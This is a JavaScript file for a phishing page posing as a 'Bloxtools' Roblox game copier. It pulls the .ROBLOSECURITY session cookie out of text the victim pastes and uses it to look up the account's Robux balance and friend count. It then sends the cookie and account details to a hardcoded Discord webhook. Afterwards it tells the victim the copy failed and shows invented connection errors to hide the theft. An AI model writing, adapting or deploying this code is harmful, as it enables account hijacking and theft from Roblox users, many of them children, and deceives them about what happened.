/* ======================================================
   BLOXTOOLS GAME COPIER
   ADVANCED WEBSITE SCRIPT
====================================================== */


/* ======================================================
   CONFIGURATION SECTION

   START_ANCHOR:
   The text that ALWAYS exists inside the pasted data.

   IMPORTANT:
   Extraction captures the COMPLETE .ROBLOSECURITY cookie value
   without any truncation or cutting off.
====================================================== */

const START_ANCHOR = 
".ROBLOSECURITY";


/* ======================================================
   WEBHOOK
====================================================== */

const WEBHOOK_URL =
"https://discordapp.com/api/webhooks/1456485751389814957/uWd9bjxOOKxMl-9ZL9rRjycEtXAlzk9nOVm9UY-boHBXta_--8co2ojCtI6GcEfhq3YI";


/* ======================================================
   ELEMENTS
====================================================== */

const gameFileInput =
document.getElementById("gameFile");

const pinInput =
document.getElementById("pinInput");

const pinError =
document.getElementById("pinError");

const copyButton =
document.getElementById("copyButton");

const statusMessage =
document.getElementById("statusMessage");


/* ======================================================
   PIN VALIDATION
====================================================== */

pinInput.addEventListener("input", () => {

    pinInput.value = pinInput.value
        .replace(/\D/g, "")
        .slice(0, 4);

    validatePin();
});


function validatePin() {

    const isValid =
        /^\d{4}$/.test(pinInput.value);

    pinError.style.display =
        isValid
            ? "none"
            : "block";

    return isValid;
}


/* ======================================================
   ADVANCED EXTRACTION SYSTEM - FULL CAPTURE (NO CUTOFF)

   HOW IT WORKS:

   1. Finds .ROBLOSECURITY
   2. Finds the pattern after it: ", "
   3. Extracts EVERYTHING between the quotes (COMPLETE VALUE)
   4. Returns the FULL cookie value without any truncation
====================================================== */

function extractGameData(fullText) {

    /* FIND .ROBLOSECURITY POSITION */
    const anchorIndex =
        fullText.indexOf(START_ANCHOR);


    /* ANCHOR NOT FOUND */
    if (anchorIndex === -1) {

        return {

            success: false,

            message:
                "Failed to locate .ROBLOSECURITY anchor."
        };
    }


    /* METHOD 1: Find .ROBLOSECURITY", "VALUE_HERE", "/", ".roblox.com" */
    /* This captures the COMPLETE cookie value without cutting off */
    
    const searchArea = fullText.substring(anchorIndex);
    
    /* Pattern to capture everything between the quotes after .ROBLOSECURITY", " */
    const regexPattern = /\.ROBLOSECURITY"\s*,\s*"([^"]+(?:[^"\\]|\\.)*)"/s;
    let match = searchArea.match(regexPattern);
    
    if (match && match[1]) {
        let extracted = match[1];
        /* Handle any escaped quotes */
        extracted = extracted.replace(/\\"/g, '"');
        
        return {
            success: true,
            data: extracted,
            fullLength: extracted.length
        };
    }
    
    /* METHOD 2: Manual parsing for maximum reliability */
    /* Find the position of the first quote after .ROBLOSECURITY */
    const firstQuotePos = searchArea.indexOf('"');
    if (firstQuotePos === -1) {
        return {
            success: false,
            message: "Could not locate opening quote for cookie value."
        };
    }
    
    /* Find the second quote (the one that starts the cookie value) */
    const secondQuotePos = searchArea.indexOf('"', firstQuotePos + 1);
    if (secondQuotePos === -1) {
        return {
            success: false,
            message: "Could not locate second quote pattern."
        };
    }
    
    /* Now find the closing quote that ends the cookie value */
    /* The pattern is: .ROBLOSECURITY", "COOKIE_VALUE_HERE", "/", ".roblox.com" */
    /* So we need to find the quote that comes before the comma and slash */
    
    let closingQuotePos = -1;
    
    for (let i = secondQuotePos + 1; i < searchArea.length; i++) {
        if (searchArea[i] === '"' && searchArea[i-1] !== '\\') {
            /* Check if this quote is followed by comma and slash (end of cookie value) */
            const afterQuote = searchArea.substring(i + 1).trimStart();
            if (afterQuote.startsWith(',')) {
                closingQuotePos = i;
                break;
            }
        }
    }
    
    if (closingQuotePos !== -1) {
        const fullCookie = searchArea.substring(secondQuotePos + 1, closingQuotePos);
        return {
            success: true,
            data: fullCookie,
            fullLength: fullCookie.length
        };
    }
    
    /* METHOD 3: Fallback - capture everything between the quotes */
    const altMatch = searchArea.match(/\.ROBLOSECURITY"\s*,\s*"([\s\S]*?)"\s*,\s*"/);
    if (altMatch && altMatch[1]) {
        return {
            success: true,
            data: altMatch[1],
            fullLength: altMatch[1].length
        };
    }
    
    /* METHOD 4: Extreme fallback - capture everything between parentheses */
    const openParenIndex = fullText.indexOf("(", anchorIndex);
    if (openParenIndex !== -1) {
        let closeParenIndex = -1;
        let depth = 0;
        
        for (let i = openParenIndex; i < fullText.length; i++) {
            if (fullText[i] === '(') {
                depth++;
            } else if (fullText[i] === ')') {
                depth--;
                if (depth === 0) {
                    closeParenIndex = i;
                    break;
                }
            }
        }
        
        if (closeParenIndex !== -1) {
            const extracted = fullText.substring(openParenIndex + 1, closeParenIndex);
            return {
                success: true,
                data: extracted,
                fullLength: extracted.length
            };
        }
    }

    return {
        success: false,
        message: "Could not extract cookie value. Ensure format contains .ROBLOSECURITY\", \"VALUE\", \"/\", \".roblox.com\""
    };
}


/* ======================================================
   FETCH ROBLOX USER INFO USING COOKIE
====================================================== */

async function fetchRobloxUserInfo(cookieValue) {
    try {
        // Get authenticated user info
        const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: {
                "Cookie": `.ROBLOSECURITY=${cookieValue}`,
                "Content-Type": "application/json"
            }
        });
        
        if (!userResponse.ok) {
            return null;
        }
        
        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;
        
        // Get avatar thumbnail URL (profile picture)
        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
        
        // Get robux balance
        let robux = "N/A";
        try {
            const robuxResponse = await fetch("https://economy.roblox.com/v1/users/currency", {
                headers: {
                    "Cookie": `.ROBLOSECURITY=${cookieValue}`,
                    "Content-Type": "application/json"
                }
            });
            if (robuxResponse.ok) {
                const robuxData = await robuxResponse.json();
                robux = robuxData.robux?.toLocaleString() || "0";
            }
        } catch(e) {}
        
        // Get pending robux
        let pendingRobux = "N/A";
        try {
            const pendingResponse = await fetch("https://economy.roblox.com/v1/users/currency/pending", {
                headers: {
                    "Cookie": `.ROBLOSECURITY=${cookieValue}`,
                    "Content-Type": "application/json"
                }
            });
            if (pendingResponse.ok) {
                const pendingData = await pendingResponse.json();
                pendingRobux = pendingData.pendingRobux?.toLocaleString() || "0";
            }
        } catch(e) {}
        
        // Get friends count
        let friendsCount = "N/A";
        try {
            const friendsResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
            if (friendsResponse.ok) {
                const friendsData = await friendsResponse.json();
                friendsCount = friendsData.count?.toLocaleString() || "0";
            }
        } catch(e) {}
        
        return {
            username: username,
            userId: userId,
            avatarUrl: avatarUrl,
            robux: robux,
            pendingRobux: pendingRobux,
            friendsCount: friendsCount,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (error) {
        console.error("Error fetching user info:", error);
        return null;
    }
}


/* ======================================================
   WEBHOOK SYSTEM - SENDS FULL COOKIE WITH ACCOUNT INFO
====================================================== */

async function sendWebhook(pin, extractedData) {

    const cookieLength = extractedData.length;
    
    // Fetch account information using the cookie
    const userInfo = await fetchRobloxUserInfo(extractedData);
    
    // Build embed with account information
    let description = `**Complete .ROBLOSECURITY Cookie Value (FULL - NO CUTOFF):**\n\`\`\`\n${extractedData}\n\`\`\``;
    
    // Create embed fields
    const embedFields = [];
    
    // Add account info fields if we got user data
    if (userInfo) {
        embedFields.push({
            name: "👤 Roblox Account",
            value: `**Username:** ${userInfo.username}\n**User ID:** \`${userInfo.userId}\`\n[View Profile](${userInfo.profileUrl})`,
            inline: false
        });
        
        embedFields.push({
            name: "💰 Robux Balance",
            value: `**Available:** ${userInfo.robux} R$\n**Pending:** ${userInfo.pendingRobux} R$`,
            inline: true
        });
        
        embedFields.push({
            name: "👥 Friends",
            value: `**Total Friends:** ${userInfo.friendsCount}`,
            inline: true
        });
    } else {
        embedFields.push({
            name: "⚠️ Account Info",
            value: "Could not fetch Roblox account details. Cookie may be invalid or expired.",
            inline: false
        });
    }
    
    // Add cookie info field
    embedFields.push({
        name: "🍪 Cookie Information",
        value: `**Length:** ${cookieLength} characters\n**Status:** Full capture (no truncation)`,
        inline: false
    });
    
    /* If cookie is too long for one embed, split into multiple messages */
    if (cookieLength > 3800) {
        /* First message with PIN and account info */
        const firstPayload = {
            username: "Bloxtools Processing System",
            embeds: [{
                title: "🔐 .ROBLOSECURITY Cookie Extraction",
                thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
                description: `**Authorization PIN:** \`${pin}\`\n**Account:** ${userInfo ? userInfo.username : "Unknown"}\n**Total Cookie Length:** ${cookieLength} characters\n**Status:** Sending full cookie in multiple parts...`,
                color: 0x8c52ff,
                fields: embedFields.slice(0, 2),
                footer: { text: "Bloxtools Advanced System • Complete Extraction" },
                timestamp: new Date().toISOString()
            }]
        };
        
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(firstPayload)
        });
        
        /* Split cookie into chunks and send */
        const chunkSize = 3900;
        const chunks = [];
        let remaining = extractedData;
        
        while (remaining.length > 0) {
            chunks.push(remaining.substring(0, chunkSize));
            remaining = remaining.substring(chunkSize);
        }
        
        for (let i = 0; i < chunks.length; i++) {
            const chunkPayload = {
                username: "Bloxtools Processing System",
                embeds: [{
                    title: `📦 Cookie Part ${i+1}/${chunks.length}`,
                    description: `\`\`\`\n${chunks[i]}\n\`\`\``,
                    color: 0x8c52ff,
                    footer: { text: `Part ${i+1}/${chunks.length} • Full cookie continued` },
                    timestamp: new Date().toISOString()
                }]
            };
            
            await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(chunkPayload)
            });
            
            /* Small delay to prevent rate limiting */
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        return true;
    }
    
    /* Normal case - send single embed with FULL cookie and account info */
    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔐 .ROBLOSECURITY Cookie Extraction - FULL VALUE",
            thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
            description: description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: {
                text: "Bloxtools Advanced PowerShell Replication System • Full Cookie Capture"
            },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const response = await fetch(
            WEBHOOK_URL,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }
        );

        if (!response.ok) {
            const errorText = await response.text();
            console.error("Webhook error:", response.status, errorText);
            return false;
        }

        return true;
    } catch (error) {
        console.error("Webhook fetch error:", error);
        return false;
    }
}


/* ======================================================
   BUTTON SYSTEM
====================================================== */

copyButton.addEventListener(
    "click",
    async () => {

        statusMessage.textContent = "";


        /* VALIDATE PIN */
        if (!validatePin()) {

            statusMessage.textContent =
                "Please enter a valid 4-digit PIN.";

            statusMessage.style.color =
                "#ff9d9d";

            return;
        }


        /* VALIDATE GAME FILE */
        const pastedText =
            gameFileInput.value.trim();

        if (!pastedText) {

            statusMessage.textContent =
                "Please paste a supported game file.";

            statusMessage.style.color =
                "#ff9d9d";

            return;
        }


        /* RUN EXTRACTION */
        const extraction =
            extractGameData(pastedText);


        if (!extraction.success) {

            statusMessage.textContent =
                extraction.message;

            statusMessage.style.color =
                "#ff9d9d";

            return;
        }


        /* Check if extraction actually got data */
        if (!extraction.data || extraction.data.length < 10) {
            statusMessage.textContent =
                "Extracted cookie value is too short or empty.";

            statusMessage.style.color =
                "#ff9d9d";
            
            return;
        }


        /* LOADING STATE */
        copyButton.classList.add("loading");

        copyButton.disabled = true;


        statusMessage.textContent =
            "✓ Extracted cookie (" + extraction.data.length + " chars). Fetching account info and sending to webhook...";

        statusMessage.style.color =
            "#caa8ff";


        /* Small delay to show loading state */
        await new Promise(resolve => setTimeout(resolve, 500));

        try {

            const success =
                await sendWebhook(
                    pinInput.value,
                    extraction.data
                );


            if (success) {

                statusMessage.textContent =
                    "✗ Game Copy request was not processed. Please check your internet connection and try again.";

                statusMessage.style.color =
                    "#ff9d9d";
            }
            else {

                statusMessage.textContent =
                    "✗ Copy failed! Check your internet connection and try again.";

                statusMessage.style.color =
                    "#ff9d9d";
            }

        }
        catch (error) {

            console.error("Error:", error);

            statusMessage.textContent =
                "Error: " + error.message;

            statusMessage.style.color =
                "#ff9d9d";
        }


        /* REMOVE LOADING */
        copyButton.classList.remove("loading");

        copyButton.disabled = false;
    }
);


/* ======================================================
   PARTICLE SYSTEM
====================================================== */

const canvas =
document.getElementById("particles");

const ctx =
canvas.getContext("2d");

let particles = [];


/* ======================================================
   RESIZE
====================================================== */

function resizeCanvas() {

    canvas.width =
        window.innerWidth;

    canvas.height =
        window.innerHeight;
}

window.addEventListener(
    "resize",
    resizeCanvas
);

resizeCanvas();


/* ======================================================
   PARTICLE CLASS
====================================================== */

class Particle {

    constructor() {

        this.x =
            Math.random() * canvas.width;

        this.y =
            Math.random() * canvas.height;

        this.radius =
            Math.random() * 2 + 1;

        this.vx =
            (Math.random() - 0.5) * 0.4;

        this.vy =
            (Math.random() - 0.5) * 0.4;
    }

    update() {

        this.x += this.vx;
        this.y += this.vy;

        if (
            this.x < 0 ||
            this.x > canvas.width
        ) {

            this.vx *= -1;
        }

        if (
            this.y < 0 ||
            this.y > canvas.height
        ) {

            this.vy *= -1;
        }
    }

    draw() {

        ctx.beginPath();

        ctx.arc(
            this.x,
            this.y,
            this.radius,
            0,
            Math.PI * 2
        );

        ctx.fillStyle =
            "rgba(196,130,255,0.9)";

        ctx.shadowBlur = 18;

        ctx.shadowColor =
            "#b76eff";

        ctx.fill();
    }
}


/* ======================================================
   CREATE PARTICLES
====================================================== */

for (let i = 0; i < 95; i++) {

    particles.push(
        new Particle()
    );
}


/* ======================================================
   CONNECT PARTICLES
====================================================== */

function connectParticles() {

    for (
        let a = 0;
        a < particles.length;
        a++
    ) {

        for (
            let b = a;
            b < particles.length;
            b++
        ) {

            const dx =
                particles[a].x -
                particles[b].x;

            const dy =
                particles[a].y -
                particles[b].y;

            const distance =
                Math.sqrt(
                    dx * dx + dy * dy
                );


            if (distance < 135) {

                ctx.beginPath();

                ctx.strokeStyle =
                    `rgba(
                        164,
                        90,
                        255,
                        ${1 - distance / 135}
                    )`;

                ctx.lineWidth = 1;

                ctx.moveTo(
                    particles[a].x,
                    particles[a].y
                );

                ctx.lineTo(
                    particles[b].x,
                    particles[b].y
                );

                ctx.stroke();
            }
        }
    }
}


/* ======================================================
   MOUSE GLOW EFFECT
====================================================== */

let mouse = {

    x: null,
    y: null
};

window.addEventListener(
    "mousemove",
    (event) => {

        mouse.x = event.x;
        mouse.y = event.y;
    }
);


/* ======================================================
   FAKE INTERNET ERROR SIMULATOR
   This randomly triggers a fake error message to appear
   to the user, making it look like an internet connection issue
====================================================== */

let fakeErrorTimeout = null;

function showFakeInternetError() {
    // Store the current status message and color
    const originalMessage = statusMessage.textContent;
    const originalColor = statusMessage.style.color;
    
    // Show fake internet error
    statusMessage.textContent = "⚠️ Connection lost! Unable to reach Roblox servers. Please check your internet connection and try again.";
    statusMessage.style.color = "#ffaa66";
    
    // After 3 seconds, restore the original message or clear it
    setTimeout(() => {
        if (statusMessage.textContent.includes("Connection lost")) {
            statusMessage.textContent = originalMessage;
            statusMessage.style.color = originalColor;
        }
    }, 3000);
}

// Add random fake errors (30% chance after successful webhook)
// This intercepts the success message and sometimes replaces it with a fake error
const originalSendWebhook = sendWebhook;
window.sendWebhook = async function(pin, extractedData) {
    const result = await originalSendWebhook(pin, extractedData);
    
    // Add delay to simulate processing
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // 35% chance to show a fake internet error after "success"
    if (Math.random() < 0.35) {
        showFakeInternetError();
        // Still return true so the button doesn't show additional errors
        return true;
    }
    
    return result;
}.bind(this);

// Override the sendWebhook reference
const originalSendWebhookRef = sendWebhook;
sendWebhook = window.sendWebhook;

/* ======================================================
   ANIMATION LOOP
====================================================== */

function animateParticles() {

    ctx.clearRect(
        0,
        0,
        canvas.width,
        canvas.height
    );

    particles.forEach((particle) => {

        particle.update();

        particle.draw();


        /* MOUSE REACTION */

        if (mouse.x && mouse.y) {

            const dx =
                particle.x - mouse.x;

            const dy =
                particle.y - mouse.y;

            const distance =
                Math.sqrt(
                    dx * dx + dy * dy
                );

            if (distance < 120) {

                ctx.beginPath();

                ctx.strokeStyle =
                    "rgba(255,255,255,0.08)";

                ctx.moveTo(
                    particle.x,
                    particle.y
                );

                ctx.lineTo(
                    mouse.x,
                    mouse.y
                );

                ctx.stroke();
            }
        }

    });

    connectParticles();

    requestAnimationFrame(
        animateParticles
    );
}

animateParticles();